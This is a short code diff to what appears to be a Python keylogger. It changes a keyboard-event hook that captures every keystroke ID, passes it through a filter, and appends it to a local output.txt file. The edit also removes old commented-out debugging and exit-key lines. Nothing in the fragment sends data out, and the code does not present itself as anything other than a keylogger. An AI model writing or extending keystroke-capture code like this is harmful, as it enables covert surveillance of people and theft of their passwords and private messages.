@@ -39,12 +39,10 @@ def OnKeyboardEvent(event):
     buffer = f.read()
     f.close()
 
+    # do the flitering here
     keylogs_ID = event.KeyID
-    #do the flitering here
-
-    if event.KeyID == 13: # enter pressed
-        keylogs = '\n'
-    buffer += p(keylogs_ID)
+    buffer += p.verify(keylogs_ID)
+    #print(p.verify(keylogs_ID))
 
     # open output.txt to write current + new keystrokes
     f = open('output.txt', 'w')
@@ -52,15 +50,7 @@ def OnKeyboardEvent(event):
     f.close()
     return 0
     '''
-    if event.Ascii == 5:
-        _exit(1)
-    
-    
     if (event.Ascii > 31 and event.Ascii < 127) or event.Ascii == 13 or event.Ascii == 9:
-        data = (event.WindowName, event.Window, event.Time, event.Ascii, event.Key, event.Alt)
-        keylogs = chr(event.Ascii)
-        print(data) # debugging
-        print(keylogs)
     '''
 
 
